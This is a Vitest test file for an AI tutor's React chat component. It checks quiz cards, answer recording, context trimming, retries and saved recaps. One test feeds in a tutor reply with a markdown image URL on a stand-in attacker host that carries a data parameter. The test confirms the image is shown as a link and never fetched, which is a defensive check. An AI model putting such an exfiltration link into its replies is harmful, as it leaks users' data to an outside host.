// @vitest-environment jsdom
import { act, createElement } from "react";
import { createRoot } from "react-dom/client";
import { renderToString } from "react-dom/server";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

import type { Course, Module, Topic } from "@gnosia/tutor/types";

/**
 * The course topic tutor's check cards (docs/proposals/structured-checks.md,
 * phase 3): a choice block or a recall block naming one of the topic's
 * concepts draws the same card the concept tutor does, and its answer is
 * recorded against that concept under the topic's session.
 */

const learner: { state: { notes: object; knowledge: Record<string, unknown> }; saveKnowledge: () => void; saveError: null } = {
  state: { notes: {}, knowledge: {} },
  saveKnowledge: vi.fn(),
  saveError: null,
};
vi.mock("@/lib/learner-context", () => ({ useLearner: () => learner }));
const router = { push: vi.fn(), replace: vi.fn(), refresh: vi.fn() };
vi.mock("next/navigation", () => ({ useRouter: () => router }));
vi.mock("@/components/TopicRecap", () => ({ RecapCard: () => null, RecapEditor: () => null }));
vi.mock("@/components/Math", async () => {
  const { createElement: h } = await import("react");
  return { MathText: ({ text }: { text: string }) => h("span", null, text) };
});

const { AgentSession } = await import("./AgentSession");

beforeAll(() => {
  (globalThis as unknown as { IS_REACT_ACT_ENVIRONMENT: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
  Object.defineProperty(HTMLElement.prototype, "scrollIntoView", { configurable: true, value() {} });
});

const topic = { id: "t1", title: "Attention", concepts: ["dot-product", "softmax"], subtopics: ["Scores"] } as unknown as Topic;
const mod = { id: "m1", slug: "m1", title: "Module", order: 1, topic: "attn", topics: [topic], resources: [] } as unknown as Module;
const course = {
  id: "cp4284",
  slug: "cp4284",
  code: "CP4284",
  title: "Transformers",
  credits: 4,
  order: 0,
  inferred: false,
  tags: [],
  modules: [mod],
  capstone: "",
} as unknown as Course;

const choice = {
  kind: "choice",
  concept: "softmax",
  question: "Why does softmax exponentiate the scores?",
  options: ["To make every weight positive", "To sort the scores", "To round the scores"],
  why: "exp is positive everywhere and keeps the order, so the weights can be normalised.",
  answer: "To make every weight positive",
};
const recall = {
  kind: "recall",
  concept: "dot-product",
  question: "What does a zero dot product say about two vectors?",
  answer: "They are orthogonal: neither has a component along the other.",
};

/** The tutor's next replies; one with a `status` is a failed turn. */
let replies: Array<{ content: string; check?: unknown; status?: number }> = [];
const fetched: Array<{ url: string; body: Record<string, unknown> }> = [];

beforeEach(() => {
  fetched.length = 0;
  router.refresh.mockClear();
  sessionStorage.clear();
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      const body = init?.body === undefined ? {} : (JSON.parse(String(init.body)) as Record<string, unknown>);
      fetched.push({ url, body });
      if (url === "/api/learner/observe") {
        return new Response(
          JSON.stringify({ ok: true, result: { correct: body.correct, pLBefore: 0.25, pLAfter: 0.41, card: { intervalDays: 1 } } }),
          { status: 200 },
        );
      }
      if (url === "/api/agent/judge") {
        return new Response(JSON.stringify({ verdict: { correct: true, feedback: "Names orthogonality." } }), { status: 200 });
      }
      const next = replies.shift() ?? { content: "Carry on." };
      if (next.status !== undefined) return new Response(JSON.stringify({ error: next.content }), { status: next.status });
      return new Response(JSON.stringify({ message: { content: next.content }, check: next.check ?? null }), { status: 200 });
    }),
  );
});

const mounted: Array<() => void> = [];
afterEach(() => {
  while (mounted.length) mounted.pop()?.();
  vi.unstubAllGlobals();
});

async function settle() {
  for (let at = 0; at < 6; at += 1) {
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
  }
}

async function mount() {
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  await act(async () => {
    root.render(
      createElement(AgentSession, { course, module: mod, topic, conceptTitles: { softmax: "Softmax", "dot-product": "Dot product" } }),
    );
  });
  mounted.push(() => {
    act(() => root.unmount());
    host.remove();
  });
  return host;
}

const button = (root: ParentNode, text: string) =>
  [...root.querySelectorAll("button")].find((b) => b.textContent?.trim() === text) as HTMLButtonElement | undefined;
async function click(el: HTMLElement | undefined) {
  expect(el).toBeDefined();
  await act(async () => el!.click());
  await settle();
}
async function type(box: HTMLTextAreaElement, text: string) {
  await act(async () => {
    Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!.call(box, text);
    box.dispatchEvent(new Event("input", { bubbles: true }));
  });
}
const card = (host: HTMLElement) => host.querySelector<HTMLElement>("section[aria-labelledby]");
const chats = () => fetched.filter((c) => c.url === "/api/agent/chat");

describe("the topic tutor's choice card", () => {
  it("records the pick against the concept the block names, under the topic's session, and tells the tutor", async () => {
    replies = [{ content: "One check on the scores.", check: choice }, { content: "Right." }];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));

    const box = card(host)!;
    expect(box.textContent).toContain(choice.question);
    await click(button(box, "To make every weight positive"));
    await click(button(box, "30%"));
    await click(button(box, "Submit"));

    const observed = fetched.filter((c) => c.url === "/api/learner/observe");
    expect(observed).toHaveLength(1);
    expect(observed[0].body).toMatchObject({
      conceptSlug: "softmax",
      correct: true,
      answer: choice.answer,
      chosen: choice.answer,
      confidence: 30,
      sessionTitle: "CP4284 · Attention",
      sessionGoal: "t1",
    });
    const sent = chats().at(-1)!.body.messages as Array<{ role: string; content: string }>;
    // The asking turn goes back with its block; the answer is the data block.
    expect(sent.at(-2)?.content).toContain("```check");
    expect(sent.at(-2)?.content).toContain('"concept":"softmax"');
    expect(sent.at(-1)?.content).toContain('Picked: "To make every weight positive" (correct)');

    const recorded = card(host)!.querySelector<HTMLElement>("[data-recorded]");
    expect(recorded?.textContent).toContain("Softmax");
    expect(recorded?.querySelector("a")?.getAttribute("href")).toBe("/learn/softmax");
    // No bubble draws the data block (the system prompt, folded in a <pre>, names it).
    const bubbles = [...host.querySelectorAll("p, span, div")].filter((el) => !el.closest("pre") && el.children.length === 0);
    expect(bubbles.some((el) => el.textContent?.includes("<check_answer>"))).toBe(false);
  });

  it("folds to Not answered when the learner types instead, and records nothing", async () => {
    replies = [{ content: "One check.", check: choice }, { content: "Sure." }];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    const composer = [...host.querySelectorAll("textarea")].at(-1)!;
    await type(composer, "Can you explain the scores first?");
    await act(async () => {
      composer.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
    });
    await settle();
    expect(host.textContent).toContain("Not answered");
    expect(fetched.filter((c) => c.url === "/api/learner/observe")).toHaveLength(0);
    expect(host.querySelector('[aria-label="Record this answer"]')).toBeNull();
  });
});

describe("the topic tutor's recall card", () => {
  it("judges the words against the commitment and records them on the learner's tap", async () => {
    replies = [{ content: "In your own words, please.", check: recall }, { content: "Good." }];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));

    const box = card(host)!;
    await type(box.querySelector<HTMLTextAreaElement>("textarea")!, "They are at right angles.");
    await click(button(box, "70%"));
    await click(button(box, "Submit"));

    const judged = fetched.find((c) => c.url === "/api/agent/judge");
    expect(judged?.body).toMatchObject({ conceptSlug: "dot-product", answer: "They are at right angles.", commitment: recall.answer });
    expect(card(host)!.textContent).toContain(recall.answer);

    await click(button(card(host)!, "Record as correct"));
    const observed = fetched.filter((c) => c.url === "/api/learner/observe");
    expect(observed).toHaveLength(1);
    expect(observed[0].body).toMatchObject({
      conceptSlug: "dot-product",
      correct: true,
      answer: recall.answer,
      chosen: "They are at right angles.",
      confidence: 70,
    });
    expect(card(host)!.querySelector("[data-recorded]")?.textContent).toContain("Dot product");
  });
});

/** Type a message in the composer and send it with Enter. */
async function say(host: HTMLElement, text: string) {
  const composer = [...host.querySelectorAll("textarea")].at(-1)!;
  await type(composer, text);
  await act(async () => {
    composer.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
  });
  await settle();
}

describe("a long topic session", () => {
  it("keeps sending past the route's bounds: each turn carries the newest part that fits, and the recap does too", async () => {
    replies = [];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    // Twenty-four exchanges of about 600 characters a side: 49 turns, some 29000 characters.
    for (let at = 0; at < 24; at += 1) {
      replies.push({ content: `Reply ${at} `.repeat(60) });
      await say(host, `Question ${at} `.repeat(50));
    }
    const last = chats().at(-1)!.body.messages as Array<{ role: string; content: string }>;
    expect(last.length).toBeLessThanOrEqual(40);
    expect(last.reduce((n, m) => n + m.content.length, 0)).toBeLessThanOrEqual(24_000);
    expect(last[0].role).toBe("user");
    expect(last.at(-1)?.content).toContain("Question 23");

    await click(button(host, "Save session recap"));
    const recap = fetched.find((c) => c.url === "/api/agent/summarize")!.body.messages as Array<{ content: string }>;
    expect(recap.length).toBeLessThanOrEqual(40);
    expect(recap.reduce((n, m) => n + m.content.length, 0)).toBeLessThanOrEqual(24_000);
  });
});

describe("the topic tutor's thread", () => {
  it("says what failed when the server answers with no JSON body", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response("<html>Bad gateway</html>", { status: 504 })));
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    const alert = host.querySelector('[role="alert"]');
    expect(alert?.textContent).toContain("The tutor did not answer (HTTP 504).");
    expect(alert?.textContent).not.toContain("undefined");
    expect(alert?.textContent).not.toContain("Unexpected token");
  });

  it("announces replies, renders the tutor's markdown, and shows a markdown image as a link it does not fetch", async () => {
    replies = [{ content: "Softmax is **positive**.\n\n![leak](https://attacker.example/p.png?d=notes)" }];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    const thread = host.querySelector('[aria-live="polite"]');
    expect(thread).not.toBeNull();
    expect(thread?.querySelector("strong")?.textContent).toBe("positive");
    expect(thread?.textContent).not.toContain("**");
    expect(host.querySelector("img")).toBeNull();
    expect(thread?.querySelector('a[href^="https://attacker.example/"]')?.textContent).toBe("leak");
  });

  it("names the concept a prose check recorded against, as a card check's row does", async () => {
    replies = [{ content: "Try one.", check: { question: "What does softmax output?", concept: "softmax" } }, { content: "Yes." }];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    await say(host, "A probability distribution.");
    await click(button(host, "Record as correct"));
    const recorded = host.querySelector<HTMLElement>("[data-recorded]");
    expect(recorded?.textContent).toContain("Softmax");
    expect(recorded?.querySelector("a")?.getAttribute("href")).toBe("/learn/softmax");
  });

  it("drops a reply that lands after the page went away", async () => {
    let answer: (r: Response) => void = () => {};
    vi.stubGlobal(
      "fetch",
      vi.fn(
        (_url: string, init?: RequestInit) =>
          new Promise<Response>((resolve, reject) => {
            answer = resolve;
            init?.signal?.addEventListener("abort", () => reject(init.signal?.reason), { once: true });
          }),
      ),
    );
    const host = await mount();
    await act(async () => button(host, "Start Socratic dialogue")!.click());
    const signal = (vi.mocked(fetch).mock.calls[0][1] as RequestInit).signal!;
    mounted.pop()?.();
    expect(signal.aborted).toBe(true);
    answer(new Response(JSON.stringify({ message: { content: "Too late." } }), { status: 200 }));
    await settle();
  });
});

describe("a failed topic turn", () => {
  it("offers Try again, which sends the unanswered turn once more rather than a second copy", async () => {
    replies = [{ content: "The tutor took too long", status: 504 }, { content: "Where shall we start?" }];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    const alert = host.querySelector('[role="alert"]');
    expect(alert?.textContent).toContain("The tutor took too long");

    await click(button(alert!, "Try again"));
    expect(chats()).toHaveLength(2);
    expect(chats()[1].body.messages).toEqual(chats()[0].body.messages);
    expect(host.querySelector('[role="alert"]')).toBeNull();
    expect(host.textContent).toContain("Where shall we start?");
  });

  it("keeps an answer's verdict row through Try again, and records it once", async () => {
    replies = [
      { content: "Try one.", check: { question: "What does softmax output?", concept: "softmax" } },
      { content: "The tutor took too long", status: 504 },
      { content: "Yes." },
    ];
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    await say(host, "A probability distribution.");
    await click(button(host.querySelector<HTMLElement>('[role="alert"]')!, "Try again"));

    const [failed, retried] = chats().slice(-2);
    expect(retried.body.messages).toEqual(failed.body.messages);
    expect(host.textContent).toContain("Yes.");
    await click(button(host, "Record as correct"));
    const observed = fetched.filter((c) => c.url === "/api/learner/observe");
    expect(observed).toHaveLength(1);
    expect(observed[0].body).toMatchObject({ conceptSlug: "softmax", correct: true });
  });
});

describe("the prior recap", () => {
  const prior = { topicId: "t1", summary: "Scores are dot products.", keyPoints: [], misconceptions: [], openQuestions: [], source: "agent", updatedAt: "2026-10-30" };
  afterEach(() => {
    learner.state.knowledge = {};
  });

  it("is in the server's HTML, so its card does not pop in after hydration", () => {
    learner.state.knowledge = { t1: prior };
    const html = renderToString(createElement(AgentSession, { course, module: mod, topic }));
    expect(html).toContain("It will resume from here rather");
  });

  it("goes to the tutor with the first turn", async () => {
    learner.state.knowledge = { t1: prior };
    const host = await mount();
    await click(button(host, "Start Socratic dialogue"));
    expect(chats()[0].body.priorKnowledge).toMatchObject({ summary: "Scores are dot products." });
  });

  it("is said to be saved with the learner's progress", () => {
    const html = renderToString(createElement(AgentSession, { course, module: mod, topic }));
    expect(html).toContain("Recaps are saved with your progress and survive a progress reset.");
    expect(html).not.toContain("live in this browser");
  });
});
